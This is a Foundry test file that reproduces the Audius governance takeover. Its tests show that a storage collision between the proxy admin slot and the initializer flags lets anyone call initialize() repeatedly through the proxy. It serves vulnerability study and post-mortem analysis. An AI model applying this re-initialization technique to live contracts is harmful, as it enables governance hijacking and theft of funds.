// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {AudiusAdminUpgradeabilityProxy} from "./Proxy/AudiusAdminUpgradeabilityProxy.sol";
import {Proxy} from "./Proxy/Proxy.sol";
import {DelegateManager} from "./Logic/DelegateManager.sol";
import {Governance} from "./Governance.sol";

// writeup: https://blog.audius.co/article/audius-governance-takeover-post-mortem-7-23-22

contract AudiusHack is Test {
    AudiusAdminUpgradeabilityProxy public adminAddress;
    DelegateManager public delegateAddress;
    Governance public govAddress;
    address public alice;
    address public targetAddr;

    function setUp() public {
        alice = address(0xABCD);
        delegateAddress = new DelegateManager();
        govAddress = new Governance();
        targetAddr = 0x4DEcA517D6817B6510798b7328F2314d3003AbAC; // @note in prod, 0x4deca517d6817b6510798b7328f2314d3003abac is governance address

        vm.etch(targetAddr, address(govAddress).code);

        adminAddress = new AudiusAdminUpgradeabilityProxy(
            address(delegateAddress),
            address(targetAddr),
            ""
        );
    }

    // Demonstrate that any user can initialize the DelegateManager.sol contract behind the proxy directly,
    // but that calling initialize directly works as expected.
    // Anyone can call initialize() because there is no `require(msg.sender == proxyAdmin);` check
    function testDirectInitialize() public {
        bytes32 beforeaction = vm.load(
            address(delegateAddress),
            bytes32(uint256(0))
        );
        emit log_uint(uint256(beforeaction)); // log the first storage slot value
        assertEq(uint256(beforeaction), 0);

        vm.prank(address(alice)); // @note switch to random address to show there are no special privileges needed to call initialize()
        delegateAddress.initialize();

        bytes32 afteraction = vm.load(
            address(delegateAddress),
            bytes32(uint256(0))
        );
        emit log_uint(uint256(afteraction)); // log the first storage slot value
        assertEq(uint256(afteraction), 1);
    }

    // When initialize() is called directly, it can only be called once. Calling initialize() a second time causes an error
    function testFailDirectIntialize() public {
        bytes32 beforeaction = vm.load(
            address(delegateAddress),
            bytes32(uint256(0))
        );
        emit log_uint(uint256(beforeaction)); // log the first storage slot value
        assertEq(uint256(beforeaction), 0);

        vm.prank(address(alice)); // @note switch to random address to show there are no special privileges needed to call initialize()
        delegateAddress.initialize();

        bytes32 afteraction = vm.load(
            address(delegateAddress),
            bytes32(uint256(0))
        );
        emit log_uint(uint256(afteraction)); // log the first storage slot value
        assertEq(uint256(afteraction), 1);

        // @note calling initialize() the 2nd time does not work, because the proper boolean values in DelegateManager.sol are set (initialized = true, initializing = false)
        delegateAddress.initialize();
    }

    // When using the AudiusAdminUpgradeabilityProxy.sol proxy's delegatecall(), we see the issue.
    // The issue is that the specific address of the governance contract makes the initializer modifier useless
    // because the last 2 bytes of the governance address sets
    function testDelegatecall() public {
        bytes32 beforeaction = vm.load(
            address(adminAddress),
            bytes32(uint256(0))
        );
        emit log_uint(uint256(beforeaction)); // log the first storage slot value

        // Check first bool value (no offset)
        assertEq(uint256(beforeaction) & 0x01, 0); // demonstrates that `bool initialized = false;` in initializer modifier
        // Check second bool value (8 bit offset, use bitshift >> 8)
        assertEq((uint256(beforeaction) & 0x0100) >> 8, 1); // demonstrates that `bool initializing = true;` in initializer modifier
        // @note `require(initializing || isConstructor() || !initialized)` logic in Initialiable.sol initializer modifier accepts the above bool values

        // Call initialize for the first time using the proxy
        (bool init_bool, bytes memory init_data) = address(adminAddress).call(
            abi.encodeWithSignature("initialize()")
        );
        assertTrue(init_bool);

        // @note the initialize function can be called multiple times using delegatecall
        // because the proxyAdmin variable in storage slot 0 of AudiusAdminUpgradeabilityProxy.sol
        // effectively sets the values of `initialized` and `initializing` in DelegateManager.sol to false
        (init_bool, init_data) = address(adminAddress).call(
            abi.encodeWithSignature("initialize()")
        );
        assertTrue(init_bool);

        (init_bool, init_data) = address(adminAddress).call(
            abi.encodeWithSignature("initialize()")
        );
        assertTrue(init_bool);
    }

    // When the governance address is changed
    function testDifferentGovernanceAddress() public {
        targetAddr = 0x4DEcA517D6817B6510798b7328F2314d30030001; // @note Not the production governance address, but used to show that the last bytes of the address control the boolean values in Initializable.sol

        vm.etch(targetAddr, address(govAddress).code);

        adminAddress = new AudiusAdminUpgradeabilityProxy(
            address(delegateAddress),
            address(targetAddr),
            ""
        );

        bytes32 beforeaction = vm.load(
            address(adminAddress),
            bytes32(uint256(0))
        );
        emit log_uint(uint256(beforeaction)); // log the first storage slot value

        // Check first bool value (no offset)
        assertEq(uint256(beforeaction) & 0x01, 1); // demonstrates that `bool initialized = false;` in initializer modifier
        // Check second bool value (8 bit offset, use bitshift >> 8)
        assertEq((uint256(beforeaction) & 0x0100) >> 8, 0); // demonstrates that `bool initializing = true;` in initializer modifier

        // Because of the value of the boolean values above, initialize() can NEVER be called from the proxy, but it could be initialized by calling the contract directly
        (bool init_bool, bytes memory init_data) = address(adminAddress).call(
            abi.encodeWithSignature("initialize()")
        );
        assertFalse(init_bool);

        // Calling initialize() without using the proxy still succeeds
        vm.prank(address(alice)); // @note switch to random address to show there are no special privileges needed to call initialize()
        delegateAddress.initialize();
    }
}
